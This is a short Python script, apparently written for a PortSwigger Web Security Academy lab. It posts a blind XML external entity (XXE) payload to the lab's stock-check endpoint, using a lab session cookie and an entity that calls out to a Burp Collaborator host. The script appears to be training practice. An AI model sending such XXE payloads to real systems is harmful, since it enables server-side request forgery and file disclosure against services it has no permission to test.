import requests

url = "https://0ab8004003ada223c0be45bf00b0001e.web-security-academy.net/product/stock"

cookies = {
	"session": "6jIreJIvrA9EffyZG45zClZGwCyH0uXJ"
}

payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
	<!ENTITY xxe SYSTEM "http://ne56vw6pn6si7ygzufgsp1ih78dy1n.burpcollaborator.net">
]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>"""

r = requests.post(url, data=payload, cookies=cookies)

print(r.text)